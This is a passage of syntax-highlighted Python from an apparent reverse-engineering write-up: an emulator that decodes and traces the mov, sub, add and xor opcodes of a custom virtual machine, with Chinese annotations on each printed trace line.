class="number">6</span>]+<span class="number">1</span>] == <span class="number">6</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">2</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&#125;</span>, 作用: mov (LOBYTE)reg[<span class="subst">&#123;opc[reg[<span class="number">6</span>]+<span class="number">2</span>]&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]&amp;<span class="number">0xFF</span>)&#125;</span>, (<span class="subst">&#123;((reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&amp;<span class="number">0xFFFFFFFF</span>)%<span class="number">4</span>&#125;</span>#BYTE)memory[<span class="subst">&#123;((reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(((memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>]&gt;&gt;((((reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&amp;<span class="number">0xFFFFFFFF</span>)%<span class="number">4</span>)*<span class="number">8</span>))&amp;<span class="number">0xFF</span>))&#125;</span>&quot;</span>)</span><br><span class="line">            reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]] = (reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]&amp;<span class="number">0xFFFFFF00</span>)+((memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>]&gt;&gt;((((reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&amp;<span class="number">0xFFFFFFFF</span>)%<span class="number">4</span>)*<span class="number">8</span>))&amp;<span class="number">0xFF</span>)</span><br><span class="line">            reg[<span class="number">6</span>] += <span class="number">5</span></span><br><span class="line">        <span class="keyword">elif</span> opc[reg[<span class="number">6</span>]+<span class="number">1</span>] == <span class="number">7</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">2</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&#125;</span>, 作用: mov memory[<span class="subst">&#123;((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&#125;</span>&quot;</span>)</span><br><span class="line">            memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>] = opc[reg[<span class="number">6</span>]+<span class="number">4</span>]</span><br><span class="line">            reg[<span class="number">6</span>] += <span class="number">5</span></span><br><span class="line">        <span class="keyword">elif</span> opc[reg[<span class="number">6</span>]+<span class="number">1</span>] == <span class="number">8</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">2</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&#125;</span>, 作用: mov reg[<span class="subst">&#123;opc[reg[<span class="number">6</span>]+<span class="number">2</span>]&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]])&#125;</span>, memory[<span class="subst">&#123;((reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]+reg[opc[reg[<span class="number">6</span>]+<span class="number">4</span>]])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]+reg[opc[reg[<span class="number">6</span>]+<span class="number">4</span>]])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>])&#125;</span>&quot;</span>)</span><br><span class="line">            reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]] = memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]+reg[opc[reg[<span class="number">6</span>]+<span class="number">4</span>]])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>]</span><br><span class="line">            reg[<span class="number">6</span>] += <span class="number">5</span></span><br><span class="line">        <span class="keyword">elif</span> opc[reg[<span class="number">6</span>]+<span class="number">1</span>] == <span class="number">9</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">2</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">5</span>])&#125;</span>, 作用: mov reg[<span class="subst">&#123;opc[reg[<span class="number">6</span>]+<span class="number">2</span>]&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]])&#125;</span>, memory[<span class="subst">&#123;((reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]+reg[opc[reg[<span class="number">6</span>]+<span class="number">4</span>]]*opc[reg[<span class="number">6</span>]+<span class="number">5</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]+reg[opc[reg[<span class="number">6</span>]+<span class="number">4</span>]]*opc[reg[<span class="number">6</span>]+<span class="number">5</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>])&#125;</span>&quot;</span>)</span><br><span class="line">            reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]] = memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]+reg[opc[reg[<span class="number">6</span>]+<span class="number">4</span>]]*opc[reg[<span class="number">6</span>]+<span class="number">5</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>]</span><br><span class="line">            reg[<span class="number">6</span>] += <span class="number">6</span></span><br><span class="line">        <span class="keyword">elif</span> opc[reg[<span class="number">6</span>]+<span class="number">1</span>] == <span class="number">10</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">2</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">5</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">6</span>])&#125;</span>, 作用: mov reg[<span class="subst">&#123;opc[reg[<span class="number">6</span>]+<span class="number">2</span>]&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]])&#125;</span>, memory[<span class="subst">&#123;((reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]+reg[opc[reg[<span class="number">6</span>]+<span class="number">4</span>]]*opc[reg[<span class="number">6</span>]+<span class="number">5</span>]+opc[reg[<span class="number">6</span>]+<span class="number">6</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]+reg[opc[reg[<span class="number">6</span>]+<span class="number">4</span>]]*opc[reg[<span class="number">6</span>]+<span class="number">5</span>]+opc[reg[<span class="number">6</span>]+<span class="number">6</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>])&#125;</span>&quot;</span>)</span><br><span class="line">            reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]] = memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]+reg[opc[reg[<span class="number">6</span>]+<span class="number">4</span>]]*opc[reg[<span class="number">6</span>]+<span class="number">5</span>]+opc[reg[<span class="number">6</span>]+<span class="number">6</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>]</span><br><span class="line">            reg[<span class="number">6</span>] += <span class="number">7</span></span><br><span class="line">        <span class="keyword">elif</span> opc[reg[<span class="number">6</span>]+<span class="number">1</span>] == <span class="number">11</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">2</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">5</span>])&#125;</span>,  作用: mov memory[<span class="subst">&#123;((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]*opc[reg[<span class="number">6</span>]+<span class="number">4</span>]])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]*opc[reg[<span class="number">6</span>]+<span class="number">4</span>]])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>])&#125;</span>, reg[<span class="subst">&#123;opc[reg[<span class="number">6</span>]+<span class="number">5</span>]&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(reg[opc[reg[<span class="number">6</span>]+<span class="number">5</span>]])&#125;</span>&quot;</span>)</span><br><span class="line">            memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]*opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>] = reg[opc[reg[<span class="number">6</span>]+<span class="number">5</span>]]</span><br><span class="line">            reg[<span class="number">6</span>] += <span class="number">6</span></span><br><span class="line">        <span class="keyword">elif</span> opc[reg[<span class="number">6</span>]+<span class="number">1</span>] == <span class="number">12</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">2</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">5</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">6</span>])&#125;</span>, 作用: mov memory[<span class="subst">&#123;((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]*opc[reg[<span class="number">6</span>]+<span class="number">4</span>]+opc[reg[<span class="number">6</span>]+<span class="number">5</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]*opc[reg[<span class="number">6</span>]+<span class="number">4</span>]+opc[reg[<span class="number">6</span>]+<span class="number">5</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>])&#125;</span>, reg[<span class="subst">&#123;opc[reg[<span class="number">6</span>]+<span class="number">6</span>]&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(reg[opc[reg[<span class="number">6</span>]+<span class="number">6</span>]])&#125;</span>&quot;</span>)</span><br><span class="line">            memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]*opc[reg[<span class="number">6</span>]+<span class="number">4</span>]+opc[reg[<span class="number">6</span>]+<span class="number">5</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>] = reg[opc[reg[<span class="number">6</span>]+<span class="number">6</span>]]</span><br><span class="line">            reg[<span class="number">6</span>] += <span class="number">7</span></span><br><span class="line">    <span class="comment"># sub</span></span><br><span class="line">    <span class="keyword">elif</span> opc[reg[<span class="number">6</span>]] == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> opc[reg[<span class="number">6</span>]+<span class="number">1</span>] == <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">2</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&#125;</span>, 作用: sub reg[<span class="subst">&#123;opc[reg[<span class="number">6</span>]+<span class="number">2</span>]&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]])&#125;</span>, memory[<span class="subst">&#123;((reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>])&#125;</span>&quot;</span>)</span><br><span class="line">            reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]] = (reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]-memory[(</span><br><span class="line">                (reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">4</span>]) &amp; <span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            reg[<span class="number">6</span>] += <span class="number">5</span></span><br><span class="line">        <span class="keyword">elif</span> opc[reg[<span class="number">6</span>]+<span class="number">1</span>] == <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">2</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&#125;</span>, 作用: sub reg[<span class="subst">&#123;opc[reg[<span class="number">6</span>]+<span class="number">2</span>]&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&#125;</span>&quot;</span>)</span><br><span class="line">            reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]] -= opc[reg[<span class="number">6</span>]+<span class="number">3</span>]</span><br><span class="line">            reg[<span class="number">6</span>] += <span class="number">4</span></span><br><span class="line">    <span class="comment"># add</span></span><br><span class="line">    <span class="keyword">elif</span> opc[reg[<span class="number">6</span>]] == <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">if</span> opc[reg[<span class="number">6</span>]+<span class="number">1</span>] == <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">2</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&#125;</span>, 作用: add memory[<span class="subst">&#123;((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&#125;</span>&quot;</span>)</span><br><span class="line">            memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>] = (memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>]+opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&amp;<span class="number">0xFFFFFFFF</span></span><br><span class="line">            reg[<span class="number">6</span>] += <span class="number">5</span></span><br><span class="line">        <span class="keyword">elif</span> opc[reg[<span class="number">6</span>]+<span class="number">1</span>] == <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">2</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&#125;</span>, 作用: add reg[<span class="subst">&#123;opc[reg[<span class="number">6</span>]+<span class="number">2</span>]&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]])&#125;</span>, memory[<span class="subst">&#123;((reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>])&#125;</span>&quot;</span>)</span><br><span class="line">            reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]] = (reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>])&amp;<span class="number">0xFFFFFFFF</span></span><br><span class="line">            reg[<span class="number">6</span>] += <span class="number">5</span></span><br><span class="line">        <span class="keyword">elif</span> opc[reg[<span class="number">6</span>]+<span class="number">1</span>] == <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">2</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&#125;</span>, 作用: add reg[<span class="subst">&#123;opc[reg[<span class="number">6</span>]+<span class="number">2</span>]&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&#125;</span>&quot;</span>)</span><br><span class="line">            reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]] = (reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span></span><br><span class="line">            reg[<span class="number">6</span>] += <span class="number">4</span></span><br><span class="line">    <span class="comment"># xor</span></span><br><span class="line">    <span class="keyword">elif</span> opc[reg[<span class="number">6</span>]] == <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">if</span> opc[reg[<span class="number">6</span>]+<span class="number">1</span>] == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">2</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&#125;</span>, 作用: xor reg[<span class="subst">&#123;opc[reg[<span class="number">6</span>]+<span class="number">2</span>]&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]])&#125;</span>, reg[<span class="subst">&#123;opc[reg[<span class="number">6</span>]+<span class="number">3</span>]&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]])&#125;</span>&quot;</span>)</span><br><span class="line">            reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]] = reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]] ^ reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]</span><br><span class="line">            reg[<span class="number">6</span>] += <span class="number">4</span></span><br><span class="line">        <span class="keyword">elif</span> opc[reg[<span class="number">6</span>]+<span class="number">1</span>] == <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">2</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&#125;</span>, 作用: xor memory[reg[arg2]+arg3], arg4&quot;</span>)</span><br><span class="line">            reg[<span class="number">6</span>] += <span class="number">5</span></span><br><span class="line">        <span class="comment"># SMC</span></span><br><span class="line">        <span class="keyword">elif</span> opc[reg[<span class="number">6</span>]+<span class="number">1</span>] == <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">2</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&#125;</span>, 作用: xor arg2, memory[reg[arg3]+arg4]&quot;</span>)</span><br><span class="line">            reg[<span class="number">6</span>] += <span class="number">5</span></span><br><span class="line">        <span class="keyword">elif</span> opc[reg[<span class="number">6</span>]+<span class="number">1</span>] == <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">2</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&#125;</span>, 作用: xor reg[arg2], arg3&quot;</span>)</span><br><span class="line">            reg[<span class="number">6</span>] += <span class="number">4</span></span><br><span class="line">    <span class="comment"># add</span></span><br><span class="line">    <span class="keyword">elif</span> 